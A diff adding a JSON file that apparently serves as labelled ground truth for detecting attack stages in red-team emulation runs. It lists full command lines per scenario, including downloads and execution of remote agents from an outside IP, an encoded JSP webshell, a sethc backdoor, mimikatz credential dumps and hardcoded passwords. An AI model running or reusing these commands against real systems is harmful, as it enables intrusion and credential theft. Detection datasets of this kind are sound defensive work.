@@ -1,0 +1,902 @@
+{
+  "WS12": [
+    {
+      "id": "A1",
+      "stage": "Initial Access",
+      "match_substring": "ping www.baidu.com -c 1",
+      "full_command": "whoami&arp -a&ipconfig&ping www.baidu.com -c 1",
+      "file_path": null,
+      "occurTime_start": "2022-03-18 16:45:42",
+      "occurTime_end": "2022-03-18 16:45:47",
+      "hostIp": "192.168.0.95"
+    },
+    {
+      "id": "A2",
+      "stage": "Initial Access",
+      "match_substring": "sangforcat.exe",
+      "full_command": "taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\\\Users\\\\Public\\\\agent.exe&cmd /c start /min C:\\\\Users\\\\Public\\\\agent.exe -opid 2f9c7075-ec33-4a29-901a-8e383f395763 -server https://124.223.85.207:8443\"",
+      "file_path": null,
+      "occurTime_start": "2022-03-18 16:45:42",
+      "occurTime_end": "2022-03-18 16:46:23",
+      "hostIp": "192.168.0.95"
+    },
+    {
+      "id": "A3",
+      "stage": "Credential Access",
+      "match_substring": "WinBrute.exe",
+      "full_command": "WinBrute.exe administrator_pass.txt administrator",
+      "file_path": "C:\\Users\\Public\\WinBrute.exe",
+      "occurTime_start": "2022-03-18 16:46:49",
+      "occurTime_end": "2022-03-18 16:46:51",
+      "hostIp": "192.168.0.95"
+    },
+    {
+      "id": "A4",
+      "stage": "Persistence",
+      "match_substring": "Execution Options\\\\sethc.exe",
+      "full_command": "reg add \"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=\"Remote Desktop\" dir=in action=allow protocol=TCP localport=3389;reg query \"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\";REG ADD \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\\\windows\\\\system32\\\\cmd.exe\" /f ; REG query \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc.exe\"",
+      "file_path": null,
+      "occurTime_start": "2022-03-18 16:46:59",
+      "occurTime_end": "2022-03-18 16:47:00",
+      "hostIp": "192.168.0.95"
+    },
+    {
+      "id": "A5",
+      "stage": "Discovery",
+      "match_substring": "nbtscan.exe",
+      "full_command": "nbtscan.exe 192.168.0.244/24",
+      "file_path": "C:\\Users\\Public\\nbtscan.exe",
+      "occurTime_start": "2022-03-18 16:47:09",
+      "occurTime_end": "2022-03-18 16:47:16",
+      "hostIp": "192.168.0.95"
+    },
+    {
+      "id": "A6",
+      "stage": "Lateral Movement",
+      "match_substring": "PAExec.exe \\\\192.168.0.244",
+      "full_command": "PAExec.exe \\\\192.168.0.244 -u administrator -p Data123456! ipconfig",
+      "file_path": "C:\\Users\\Public\\PAExec.exe",
+      "occurTime_start": "2022-03-18 16:47:20",
+      "occurTime_end": "2022-03-18 16:47:39",
+      "hostIp": "192.168.0.95"
+    }
+  ],
+  "Ubuntu": [
+    {
+      "id": "A1",
+      "stage": "Initial Access",
+      "match_substring": "d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA==",
+      "full_command": "echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+      "file_path": null,
+      "occurTime_start": "2022-03-25 15:16:18",
+      "occurTime_end": "2022-03-25 15:16:30",
+      "hostIp": "192.168.0.155"
+    },
+    {
+      "id": "A2",
+      "stage": "Initial Access",
+      "match_substring": "sandcat-linux",
+      "full_command": "curl -O  http://124.223.85.207:8079/sandcat-linux ; chmod +x sandcat-linux ;nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &\"",
+      "file_path": null,
+      "occurTime_start": "2022-03-25 15:16:18",
+      "occurTime_end": "2022-03-25 15:16:30",
+      "hostIp": "192.168.0.155"
+    },
+    {
+      "id": "A5",
+      "stage": "Credential Access",
+      "match_substring": "fscan-main.zip",
+      "full_command": "mkdir -p fscan && unzip -o -d ./fscan fscan-main.zip && chmod +x ./fscan/main && ./fscan/main -m mssql -h 192.168.0.0/24 -user sa -pwd Sa123456",
+      "file_path": "/usr/tomcat/apache-tomcat-8.5.76/bin/fscan/main",
+      "occurTime_start": "2022-03-25 15:16:37",
+      "occurTime_end": "2022-03-25 15:16:45",
+      "hostIp": "192.168.0.155"
+    },
+    {
+      "id": "A3",
+      "stage": "Initial Access",
+      "match_substring": "PCUhIFN0cmluZyBpRWhEbFhkeUIgPSBuZXcgU3RyaW5n",
+      "full_command": "echo PCUhIFN0cmluZyBpRWhEbFhkeUIgPSBuZXcgU3RyaW5nKG5ldyBTdHJpbmcobmV3IGJ5dGVbXXsgMTEsfSkpOyU+PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT4NCjwlY2xhc3MvKiovJT48JVUlPjwlZXh0ZW5kcyU+PCVDbGFzc0xvYWRlcntVJT48JShDbGFzc0xvYWRlciBjKSU+PCV7c3VwZXIoYyk7JT48JX0lPjwlcHVibGljJT48JUNsYXNzJT48JWcoYnl0ZSU+PCVbLyoqL11iKXtyZXR1cm4lPjwlc3VwZXIuJT48JWRlZmluZUNsYXNzJT48JSglPjwlYiU+PCUsMCoxLGIuJT48JWxlbmd0aCk7fX0lPjwlISU+PCVpZiU+PCUocmVxdWVzdC4lPjwlZ2V0TWV0aG9kKCU+PCUpLiU+PCVlcXVhbHMoJT48JSJQT1NUIiU+PCUpKSU+PCV7U3RyaW5nJT48JWs9ImU0NWUzMjlmZWI1ZDkyNWIiOyU+PCVzZXNzaW9uLiU+PCVwdXRWYWx1ZSgidSIsayk7JT48JUNpcGhlciU+PCVjPSU+PCVDaXBoZXIuJT48JWdldEluc3RhbmNlKCU+PCUiQUVTIik7JT48JWMuaW5pdCglPjwlMixuZXclPjwlU2VjcmV0S2V5U3BlYyhrLiU+PCVnZXRCeXRlcyglPjwlKSwiQUVTIikpOyU+PCVuZXclPjwlVSh0aGlzLmdldENsYXNzKCU+PCUpLmdldENsYXNzTG9hZGVyKCU+PCUpKS4lPjwlZyhjLiU+PCVkb0ZpbmFsKG5ldyU+PCVzdW4uJT48JW1pc2MuJT48JUJBU0U2NERlY29kZXIlPjwlKCU+PCUpLiU+PCVkZWNvZGVCdWZmZXIlPjwlKHJlcXVlc3QlPjwlLiU+PCVnZXRSZWFkZXIoJT48JSkuJT48JXJ",
+      "file_path": null,
+      "occurTime_start": "2022-03-25 15:16:38",
+      "occurTime_end": "2022-03-25 15:16:41",
+      "hostIp": "192.168.0.155"
+    },
+    {
+      "id": "A4",
+      "stage": "Persistence",
+      "match_substring": null,
+      "full_command": "whoami",
+      "file_path": null,
+      "occurTime_start": "2022-03-25 15:16:38",
+      "occurTime_end": "2022-03-25 15:16:49",
+      "hostIp": "192.168.0.155"
+    },
+    {
+      "id": "A6",
+      "stage": "Lateral Movement",
+      "match_substring": "sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --enable",
+      "full_command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --enable && ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami",
+      "file_path": "/usr/tomcat/apache-tomcat-8.5.76/bin/sqltool_amd64_upx",
+      "occurTime_start": "2022-03-25 15:16:47",
+      "occurTime_end": "2022-03-25 15:16:47",
+      "hostIp": "192.168.0.155"
+    },
+    {
+      "id": "A7",
+      "stage": "Lateral Movement",
+      "match_substring": "Public\\sandcat.exe",
+      "full_command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=\\\"https://124.223.85.207:8443\\\";[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$url=$ip+\\\"/file/download\\\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\\\"company_code\\\",1234567);$wc.Headers.add(\\\"platform\\\",\\\"windows\\\");$wc.Headers.add(\\\"file\\\",\\\"sandcat.go\\\"); $output=\\\"C:\\Users\\Public\\sandcat.exe\\\";$wc.DownloadFile($url,$output);cmd /c start /min C:\\Users\\Public\\sandcat.exe -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -server https://124.223.85.207:8443'",
+      "file_path": "/usr/tomcat/apache-tomcat-8.5.76/bin/sqltool_amd64_upx",
+      "occurTime_start": "2022-03-25 15:16:47",
+      "occurTime_end": "2022-03-25 15:17:30",
+      "hostIp": "192.168.0.155"
+    },
+    {
+      "id": "A8",
+      "stage": "Privilege Escalation",
+      "match_substring": "JuicyPotato_x64.exe",
+      "full_command": "JuicyPotato_x64.exe -a whoami & JuicyPotato_x64.exe -a whoami & JuicyPotato_x64.exe -a whoami & JuicyPotato_x64.exe -a whoami",
+      "file_path": "C:\\Users\\Public\\JuicyPotato_x64.exe",
+      "occurTime_start": "2022-03-25 15:18:20",
+      "occurTime_end": "2022-03-25 15:18:43",
+      "hostIp": "192.168.0.244"
+    }
+  ],
+  "APT29": [
+    {
+      "id": "A1",
+      "stage": "Initial Access",
+      "match_substring": "chromeRemoteServices.ps1",
+      "full_command": ".\\chromeRemoteServices.ps1",
+      "file_path": "C:\\Users\\Administrator\\Desktop\\shell\\chromeRemoteServices.ps1",
+      "occurTime_start": "2022-04-08 15:09:58.000",
+      "occurTime_end": "2022-04-08 15:10:13.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A2",
+      "stage": "Execution",
+      "match_substring": "downloadstring('http://124.223.85.207:8082/a')",
+      "full_command": "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:10:16.000",
+      "occurTime_end": "2022-04-08 15:10:47.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A3",
+      "stage": "Execution",
+      "match_substring": "T1059.003",
+      "full_command": "Invoke-AtomicTest T1059.003 -GetPrereqs; Invoke-AtomicTest T1059.003",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:10:27.000",
+      "occurTime_end": "2022-04-08 15:10:38.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A4",
+      "stage": "Execution",
+      "match_substring": "T1059.006.py",
+      "full_command": "T1059.006.py",
+      "file_path": "C:\\Users\\Administrator\\Desktop\\shell\\T1059.006.py",
+      "occurTime_start": "2022-04-08 15:10:37.000",
+      "occurTime_end": "2022-04-08 15:10:40.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A5",
+      "stage": "Execution",
+      "match_substring": "1053.005.bat",
+      "full_command": "schtasks /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:10:47.000",
+      "occurTime_end": "2022-04-08 15:10:48.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A6",
+      "stage": "Execution",
+      "match_substring": "wmic computersystem get domain",
+      "full_command": "wmic computersystem get domain",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:10:58.000",
+      "occurTime_end": "2022-04-08 15:10:59.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A7",
+      "stage": "Persistence",
+      "match_substring": "t1547.001",
+      "full_command": "Invoke-AtomicTest t1547.001 -TestNumbers 1",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:11:09.000",
+      "occurTime_end": "2022-04-08 15:11:25.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A8",
+      "stage": "Persistence",
+      "match_substring": "T1547.009",
+      "full_command": "Invoke-AtomicTest T1547.009 -TestNumbers 1",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:11:19.000",
+      "occurTime_end": "2022-04-08 15:11:27.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A9",
+      "stage": "Persistence",
+      "match_substring": "T1546.008",
+      "full_command": "Invoke-AtomicTest T1546.008 -TestNumbers 1",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:11:30.000",
+      "occurTime_end": "2022-04-08 15:11:42.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A10",
+      "stage": "Persistence",
+      "match_substring": "chromeRemoteServices.ps1",
+      "full_command": ".\\chromeRemoteServices.ps1",
+      "file_path": "C:\\Users\\Administrator\\Desktop\\shell\\chromeRemoteServices.ps1",
+      "occurTime_start": "2022-04-08 15:11:40.000",
+      "occurTime_end": "2022-04-08 15:12:17.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A11",
+      "stage": "Persistence",
+      "match_substring": "1053.005.bat",
+      "full_command": "schtasks /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:11:50.000",
+      "occurTime_end": "2022-04-08 15:11:50.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A12",
+      "stage": "Privilege Escalation",
+      "match_substring": "T1548.002 -TestNumbers 2",
+      "full_command": "Invoke-AtomicTest T1548.002 -TestNumbers 2",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:12:25.000",
+      "occurTime_end": "2022-04-08 15:12:28.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A13",
+      "stage": "Privilege Escalation",
+      "match_substring": "T1547.009",
+      "full_command": "Invoke-AtomicTest T1547.009 -TestNumbers 1",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:12:36.000",
+      "occurTime_end": "2022-04-08 15:12:37.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A14",
+      "stage": "Privilege Escalation",
+      "match_substring": "T1546.008",
+      "full_command": "Invoke-AtomicTest T1546.008 -TestNumbers 1",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:12:46.000",
+      "occurTime_end": "2022-04-08 15:12:48.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A15",
+      "stage": "Privilege Escalation",
+      "match_substring": "1053.005.bat",
+      "full_command": "schtasks /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:12:56.000",
+      "occurTime_end": "2022-04-08 15:12:56.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A16",
+      "stage": "Defense Evasion",
+      "match_substring": "Invoke-AtomicTest T1548.002",
+      "full_command": "Invoke-AtomicTest T1548.002",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:13:07.000",
+      "occurTime_end": "2022-04-08 15:13:15.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A17",
+      "stage": "Defense Evasion",
+      "match_substring": "certutil.exe -decode a.txt b.txt",
+      "full_command": "certutil.exe -decode a.txt b.txt",
+      "file_path": "C:\\Users\\Administrator\\Desktop\\shell\\a.txt",
+      "occurTime_start": "2022-04-08 15:13:17.000",
+      "occurTime_end": "2022-04-08 15:13:17.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A18",
+      "stage": "Defense Evasion",
+      "match_substring": "HookSSLX64.dll",
+      "full_command": "del /f HookSSLX64.dll",
+      "file_path": "C:\\Users\\Administrator\\Desktop\\shell\\HookSSLX64.dll",
+      "occurTime_start": "2022-04-08 15:13:28.000",
+      "occurTime_end": "2022-04-08 15:13:28.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A19",
+      "stage": "Defense Evasion",
+      "match_substring": "timestomp/timestomp.txt",
+      "full_command": "mkdir timestomp ; echo ipconfig /all > timestomp/timestomp.txt ; (ls timestomp).LastWriteTime=\u201c2020-10-10 12:12:12\u201d",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:13:38.000",
+      "occurTime_end": "2022-04-08 15:13:38.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A20",
+      "stage": "Defense Evasion",
+      "match_substring": "spolsv.exe",
+      "full_command": "spolsv.exe",
+      "file_path": "C:\\Users\\Administrator\\Desktop\\shell\\spolsv.exe",
+      "occurTime_start": "2022-04-08 15:13:48.000",
+      "occurTime_end": "2022-04-08 15:13:48.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A21",
+      "stage": "Defense Evasion",
+      "match_substring": "spolsv.exe",
+      "full_command": "spolsv.exe",
+      "file_path": "C:\\Users\\Administrator\\Desktop\\shell\\spolsv.exe",
+      "occurTime_start": "2022-04-08 15:13:58.000",
+      "occurTime_end": "2022-04-08 15:13:58.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A22",
+      "stage": "Defense Evasion",
+      "match_substring": "LockWorkStation",
+      "full_command": "rundll32 user32.dll,LockWorkStation",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:14:09.000",
+      "occurTime_end": "2022-04-08 15:14:09.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A23",
+      "stage": "Defense Evasion",
+      "match_substring": "localport=80",
+      "full_command": "netsh advfirewall firewall add rule name=\"test\" dir=in protocol=tcp action=allow localport=80",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:14:19.000",
+      "occurTime_end": "2022-04-08 15:14:19.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A24",
+      "stage": "Credential Access",
+      "match_substring": "mimikatz2.exe",
+      "full_command": "mimikatz2.exe  lsadump::sam exit",
+      "file_path": "C:\\Users\\Administrator\\Desktop\\shell\\mimikatz2.exe",
+      "occurTime_start": "2022-04-08 15:14:30.000",
+      "occurTime_end": "2022-04-08 15:14:30.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A25",
+      "stage": "Discovery",
+      "match_substring": "net localgroup",
+      "full_command": "net localgroup",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:14:40.000",
+      "occurTime_end": "2022-04-08 15:14:40.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A26",
+      "stage": "Discovery",
+      "match_substring": "nltest /domain_trusts",
+      "full_command": "nltest /domain_trusts",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:14:50.000",
+      "occurTime_end": "2022-04-08 15:14:50.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A27",
+      "stage": "Discovery",
+      "match_substring": "systemdrive%\\Users\\*.*",
+      "full_command": "dir %systemdrive%\\Users\\*.*",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:15:01.000",
+      "occurTime_end": "2022-04-08 15:15:01.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A28",
+      "stage": "Discovery",
+      "match_substring": "net localgroup",
+      "full_command": "net localgroup",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:15:11.000",
+      "occurTime_end": "2022-04-08 15:15:11.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A29",
+      "stage": "Discovery",
+      "match_substring": "tasklist",
+      "full_command": "tasklist",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:15:21.000",
+      "occurTime_end": "2022-04-08 15:15:21.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A30",
+      "stage": "Discovery",
+      "match_substring": "arp -a",
+      "full_command": "arp -a",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:15:31.000",
+      "occurTime_end": "2022-04-08 15:15:31.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A31",
+      "stage": "Discovery",
+      "match_substring": "systeminfo",
+      "full_command": "systeminfo",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:15:42.000",
+      "occurTime_end": "2022-04-08 15:15:43.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A32",
+      "stage": "Lateral Movement",
+      "match_substring": "mimikatz.exe",
+      "full_command": "mimikatz.exe  LSADUMP::DCSync exit",
+      "file_path": "C:\\Users\\Administrator\\Desktop\\shell\\mimikatz.exe",
+      "occurTime_start": "2022-04-08 15:15:52.000",
+      "occurTime_end": "2022-04-08 15:15:52.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A33",
+      "stage": "Collection",
+      "match_substring": "T1022.zip",
+      "full_command": "mkdir C:\\%HOMEPATH%\\Desktop\\T1022  & echo ipconfig /all > C:\\%HOMEPATH%\\Desktop\\T1022\\T1022.txt & 7z.exe a -tzip T1022.zip C:\\%HOMEPATH%\\Desktop\\T1022",
+      "file_path": "C:\\Users\\Administrator\\Desktop\\shell\\7z.dll7z.exe",
+      "occurTime_start": "2022-04-08 15:16:03.000",
+      "occurTime_end": "2022-04-08 15:16:03.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A34",
+      "stage": "Command and Control",
+      "match_substring": "Invoke-WebRequest http://124.223.85.207:8082/Test.hta",
+      "full_command": "Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \"application/json\"",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:16:13.000",
+      "occurTime_end": "2022-04-08 15:16:14.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A35",
+      "stage": "Command and Control",
+      "match_substring": "evil-kiwi.png",
+      "full_command": "Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg",
+      "file_path": "C:\\Users\\Administrator\\Desktop\\shell\\Invoke-PSImage.ps\nC:\\Users\\Administrator\\Desktop\\shell\\995647.jpg\nC:\\Users\\Administrator\\Desktop\\shell\\Invoke-Mimikatz.ps1",
+      "occurTime_start": "2022-04-08 15:16:23.000",
+      "occurTime_end": "2022-04-08 15:16:39.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A36",
+      "stage": "Command and Control",
+      "match_substring": "urlcache -split -f  http://124.223.85.207:8082/Test.hta",
+      "full_command": "certutil -urlcache -split -f  http://124.223.85.207:8082/Test.hta",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:16:33.000",
+      "occurTime_end": "2022-04-08 15:16:34.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A37",
+      "stage": "Command and Control",
+      "match_substring": "portproxy add v4tov4 listenport=65535",
+      "full_command": "netsh interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 15:16:44.000",
+      "occurTime_end": "2022-04-08 15:16:44.000",
+      "hostIp": "192.168.0.74"
+    }
+  ],
+  "Sidewinder": [
+    {
+      "id": "A1",
+      "stage": "Execution",
+      "match_substring": "downloadstring('http://124.223.85.207:8082/a')",
+      "full_command": "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:30:40.000",
+      "occurTime_end": "2022-04-08 14:31:10.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A2",
+      "stage": "Execution",
+      "match_substring": "T1059.005",
+      "full_command": "Invoke-AtomicTest T1059.005  -TestNumbers 1",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:30:50.000",
+      "occurTime_end": "2022-04-08 14:30:52.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A3",
+      "stage": "Execution",
+      "match_substring": "T1059.007.vbs",
+      "full_command": "cscript.exe  /e:VBScript.Encode T1059.007.vbs",
+      "file_path": "C:\\Users\\Administrator\\Desktop\\shell\\T1059.007.vbs",
+      "occurTime_start": "2022-04-08 14:31:00.000",
+      "occurTime_end": "2022-04-08 14:31:00.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A4",
+      "stage": "Persistence",
+      "match_substring": "t1547.001",
+      "full_command": "Invoke-AtomicTest t1547.001 -TestNumbers 1",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:31:11.000",
+      "occurTime_end": "2022-04-08 14:31:12.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A5",
+      "stage": "Persistence",
+      "match_substring": "verifierdlls",
+      "full_command": "reg add \"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \" /v \"verifierdlls \" /d \"1 \" /f",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:31:21.000",
+      "occurTime_end": "2022-04-08 14:31:22.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A6",
+      "stage": "Defense Evasion",
+      "match_substring": "spolsv.exe",
+      "full_command": "spolsv.exe",
+      "file_path": "C:\\Users\\Administrator\\Desktop\\shell\\spolsv.exe",
+      "occurTime_start": "2022-04-08 14:31:32.000",
+      "occurTime_end": "2022-04-08 14:31:32.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A7",
+      "stage": "Defense Evasion",
+      "match_substring": "T1218.005.hta",
+      "full_command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:31:42.000",
+      "occurTime_end": "2022-04-08 14:31:42.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A8",
+      "stage": "Discovery",
+      "match_substring": "systemdrive%\\Users\\*.*",
+      "full_command": "dir %systemdrive%\\Users\\*.*",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:31:53.000",
+      "occurTime_end": "2022-04-08 14:31:53.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A9",
+      "stage": "Discovery",
+      "match_substring": "tasklist",
+      "full_command": "tasklist",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:32:03.000",
+      "occurTime_end": "2022-04-08 14:32:03.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A10",
+      "stage": "Discovery",
+      "match_substring": "systeminfo",
+      "full_command": "systeminfo",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:32:13.000",
+      "occurTime_end": "2022-04-08 14:32:15.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A11",
+      "stage": "Discovery",
+      "match_substring": "net time \\\\127.0.0.1",
+      "full_command": "net time \\\\127.0.0.1",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:32:24.000",
+      "occurTime_end": "2022-04-08 14:32:24.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A12",
+      "stage": "Discovery",
+      "match_substring": null,
+      "full_command": "whoami",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:32:34.000",
+      "occurTime_end": "2022-04-08 14:32:34.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A13",
+      "stage": "Discovery",
+      "match_substring": "route print -4",
+      "full_command": "ipconfig & arp -a & route print -4",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:32:44.000",
+      "occurTime_end": "2022-04-08 14:32:45.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A14",
+      "stage": "Command and Control",
+      "match_substring": "Invoke-WebRequest http://124.223.85.207:8082/Test.hta",
+      "full_command": "Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:32:54.000",
+      "occurTime_end": "2022-04-08 14:32:54.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A15",
+      "stage": "Command and Control",
+      "match_substring": "urlcache -split -f  http://124.223.85.207:8082/Test.hta",
+      "full_command": "certutil -urlcache -split -f  http://124.223.85.207:8082/Test.hta",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:33:15.000",
+      "occurTime_end": "2022-04-08 14:33:16.000",
+      "hostIp": "192.168.0.74"
+    }
+  ],
+  "FIN6": [
+    {
+      "id": "A1",
+      "stage": "Execution",
+      "match_substring": "downloadstring('http://124.223.85.207:8082/a')",
+      "full_command": "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:05:33.000",
+      "occurTime_end": "2022-04-08 14:10:33.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A2",
+      "stage": "Execution",
+      "match_substring": "T1059.003_script.bat",
+      "full_command": "Start-Process .\\T1059.003_script.bat",
+      "file_path": "C:\\Users\\Administrator\\Desktop\\shell\\T1059.003_script.bat",
+      "occurTime_start": "2022-04-08 14:05:43.000",
+      "occurTime_end": "2022-04-08 14:05:44.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A3",
+      "stage": "Execution",
+      "match_substring": "T1059.007.vbs",
+      "full_command": "cscript.exe  /e:VBScript.Encode T1059.007.vbs",
+      "file_path": "C:\\Users\\Administrator\\Desktop\\shell\\T1059.007.vbs",
+      "occurTime_start": "2022-04-08 14:05:53.000",
+      "occurTime_end": "2022-04-08 14:05:53.000",
+      "hostIp": "192.168.0.74"
+    },
+    {
+      "id": "A4",
+      "stage": "Execution",
+      "match_substring": "1053.005.bat",
+      "full_command": "schtasks /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon",
+      "file_path": null,
+      "occurTime_start": "2022-04-08 14:06:04.000",
